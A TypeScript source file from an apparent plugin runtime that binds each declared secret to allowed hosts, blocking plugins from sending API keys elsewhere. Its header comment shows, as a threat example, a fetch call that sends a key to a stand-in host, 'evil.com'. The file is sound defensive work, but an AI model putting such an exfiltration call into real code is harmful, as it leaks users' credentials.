// Per-secret host binding — defence against the
// "declare benign-looking network capability, smuggle secret out" attack.
//
// Threat: a malicious BLANK.md declares
//
//   network: [api.groq.com, evil.com]
//   secrets: [GROQ_API_KEY]
//
// then `await ctx.fetch('https://evil.com', { headers: { x: ctx.secrets.GROQ_API_KEY }})`
// exfiltrates the key. The network allow-list alone isn't enough —
// the blank needs both endpoints (one for legit use, one for
// exfiltration), and a permissive hostname check lets it have both.
//
// Defence has two layers (INFOSEC F4 — May 2026 hardening):
//
// 1. **Primary: deny-by-default destination allow-list.** When at
//    least one declared secret has a non-empty `secret-hosts.<NAME>`
//    binding, EVERY fetch from the blank must target a host in the
//    union of those bindings. Refused otherwise — payload doesn't
//    matter. Defeats encoding bypasses (base64, fragmentation, etc.)
//    structurally: the attacker can't reach `evil.com` regardless of
//    how the value is encoded, because `evil.com` isn't in any
//    binding.
//
// 2. **Secondary: literal-value payload scan.** Within the destination
//    allow-list, also scan the URL/headers/body for any bound secret
//    value. Refuse if a value appears at a host that isn't in THAT
//    secret's binding. (Catches the rare case where multiple bound
//    secrets co-exist and one is sent to the other's host.)
//
// Frontmatter:
//
//   secrets: [GROQ_API_KEY, FINNHUB_API_KEY]
//   secret-hosts.GROQ_API_KEY: [api.groq.com]
//   secret-hosts.FINNHUB_API_KEY: [finnhub.io]
//
// Secrets without bindings (`secret-hosts.<NAME>` absent / empty) are
// "unrestricted" — they can flow anywhere the network allow-list
// permits AND they DO NOT engage layer 1. Authors who want the strong
// destination-allow-list MUST declare bindings; authors who want the
// old behaviour omit `secret-hosts.<NAME>`. The `opencues review`
// static-parse warns on `secrets:` declared without matching
// `secret-hosts.<NAME>` so the strong defence is the default for
// reviewed packs.

export interface BoundSecret {
  /** Env-var name (only used in error messages). */
  readonly name: string;
  /** The secret value to scan for. Empty / undefined are skipped. */
  readonly value: string;
  /** Hostnames where this secret may legitimately appear. Empty array =
   *  no binding (unrestricted; flow allowed wherever fetch allows). */
  readonly allowedHosts: readonly string[];
}

export interface RequestParts {
  /** Target hostname (already lowercased). */
  readonly hostname: string;
  /** Full URL — searched as a string for secret values. */
  readonly url: string;
  /** Headers, stringified. */
  readonly headers: string;
  /** Body, stringified (if not string-like, "") */
  readonly body: string;
}

export function buildRequestParts(url: string, init?: RequestInit): RequestParts {
  let hostname = '';
  try { hostname = new URL(url).hostname.toLowerCase(); } catch { /* validated upstream */ }

  let headers = '';
  if (init?.headers) {
    if (init.headers instanceof Headers) {
      const parts: string[] = [];
      init.headers.forEach((v, k) => parts.push(`${k}: ${v}`));
      headers = parts.join('\n');
    } else if (Array.isArray(init.headers)) {
      headers = init.headers.map(([k, v]) => `${k}: ${v}`).join('\n');
    } else {
      headers = Object.entries(init.headers as Record<string, string>)
        .map(([k, v]) => `${k}: ${v}`).join('\n');
    }
  }

  let body = '';
  const b = init?.body;
  if (typeof b === 'string') body = b;
  // FormData/Blob/etc. — can't cheaply scan; conservatively treat as
  // a leak risk by stringifying. Most user blanks send JSON strings.
  else if (b && typeof (b as { toString?: () => string }).toString === 'function') {
    try { body = String(b); } catch { body = ''; }
  }

  return { hostname, url, headers, body };
}

/**
 * Two-layer enforcement (see file header):
 *
 *  - Layer 1 (primary): if ANY bound secret has a non-empty allow-list,
 *    the target host must be in the UNION of those allow-lists. This
 *    is the deny-by-default destination control — defeats encoding
 *    bypasses because the attacker can't reach the exfil host at all.
 *
 *  - Layer 2 (secondary): within an allowed host, also scan the
 *    URL/headers/body for any bound secret VALUE. If a value appears
 *    at a host that isn't in THAT secret's allow-list, refuse. Catches
 *    multi-secret cross-talk (e.g. blank has both GROQ + FINNHUB bound;
 *    GROQ value smuggled to finnhub.io is refused).
 *
 * Throws on either violation; otherwise returns.
 */
/** Shape of the request object ctx.llm() / handler.llm() receives.
 *  Typed as `string` per the public BlankContext/LlmAdapter contract,
 *  but the runtime value crosses an untrusted boundary (user-blank
 *  code directly, or — on the subprocess loader — a JSON.parse over
 *  IPC) and must be treated as unreliable until coerced. See
 *  `buildLlmSecretGuard`. */
export interface LlmCallRequest {
  prompt: string;
  system?: string;
  model?: string;
  maxTokens?: number;
  temperature?: number;
}

/**
 * Builds the `ctx.llm()` dispatch function shared by both user-blank
 * loaders (in-process `node-loader.ts`/`registry.ts` and the
 * Bun-subprocess `subprocess-loader.ts`). Resolves the LLM endpoint
 * hostname once — used to enforce `secret-hosts` bindings on the
 * outgoing prompt+system body — then on every call coerces
 * `prompt`/`system` to strings BEFORE both scanning and dispatching,
 * so the bytes `enforceSecretBindings` scans are exactly the bytes
 * that reach the wire (INFOSEC NF1 + second-pass hardening: a
 * non-string field would otherwise stringify to `"[object Object]"`
 * in the scan while the real value serialized into the wire body
 * downstream).
 *
 * Extracted so the two loaders can't drift on this guard again — NF1
 * itself WAS that drift (fetch guarded on both loaders, llm guarded on
 * only one), and the second-pass coercion fix had to be hand-applied
 * to both call sites in the same PR. One shared implementation
 * structurally prevents a third repeat.
 */
export function buildLlmSecretGuard(
  provider: string,
  boundSecrets: readonly BoundSecret[],
  secrets: Readonly<Record<string, string>> | undefined,
  llmFn: (provider: string, req: LlmCallRequest) => Promise<string>,
): (req: LlmCallRequest) => Promise<string> {
  let llmHostname = '';
  if (secrets && boundSecrets.length > 0) {
    try {
      // eslint-disable-next-line @typescript-eslint/no-require-imports, @typescript-eslint/no-var-requires
      const core = require('@opencues/core') as typeof import('@opencues/core');
      const resolved = core.resolveLLM({
        apiKeys: secrets as Record<string, string>,
        globalProvider: provider,
      });
      if (resolved) {
        try { llmHostname = new URL(resolved.endpoint).hostname.toLowerCase(); }
        catch { /* leave empty → all bound secrets refused on llm path */ }
      }
    } catch { /* core not available — skip scan */ }
  }

  return async (req) => {
    const prompt = typeof req.prompt === 'string' ? req.prompt : String(req.prompt);
    const system = req.system == null ? undefined : String(req.system);
    const safeReq = { ...req, prompt, system };
    if (boundSecrets.length > 0) {
      enforceSecretBindings({
        hostname: llmHostname,
        url: '',
        headers: '',
        body: `${system ?? ''}\n${prompt}`,
      }, boundSecrets);
    }
    return llmFn(provider, safeReq);
  };
}

export function enforceSecretBindings(
  parts: RequestParts,
  secrets: readonly BoundSecret[],
): void {
  // Layer 1: destination allow-list. Only engages if at least one bound
  // secret carries a non-empty allow-list — secrets with no binding
  // remain unrestricted (back-compat for blanks that haven't opted in).
  const boundUnion = new Set<string>();
  for (const sec of secrets) {
    if (!sec.value) continue;
    if (sec.allowedHosts.length === 0) continue;
    for (const h of sec.allowedHosts) boundUnion.add(h.toLowerCase());
  }
  if (boundUnion.size > 0 && !boundUnion.has(parts.hostname)) {
    const boundNames = secrets
      .filter(s => s.value && s.allowedHosts.length > 0)
      .map(s => s.name);
    throw new Error(
      `ctx.fetch: blank declares bound secret${boundNames.length === 1 ? '' : 's'} ` +
      `[${boundNames.join(', ')}]; outbound requests must target a host in the union of ` +
      `secret-hosts bindings [${[...boundUnion].sort().join(', ')}]. ` +
      `Refused "${parts.hostname}" — not in any binding. ` +
      `(INFOSEC F4: deny-by-default destination control; defeats encoded exfil.)`,
    );
  }

  // Layer 2: per-secret literal-value scan. Within an allowed host,
  // still verify a specific bound secret's value isn't being smuggled
  // to a host outside ITS own binding.
  for (const sec of secrets) {
    if (!sec.value) continue;
    if (sec.allowedHosts.length === 0) continue; // unrestricted
    if (sec.allowedHosts.some(h => h.toLowerCase() === parts.hostname)) continue;

    const present =
      parts.url.includes(sec.value) ||
      parts.headers.includes(sec.value) ||
      parts.body.includes(sec.value);

    if (present) {
      throw new Error(
        `ctx.fetch: secret "${sec.name}" is bound to [${sec.allowedHosts.join(', ')}], ` +
        `cannot be sent to "${parts.hostname}" (declared secret-hosts.${sec.name} in BLANK.md)`,
      );
    }
  }
}
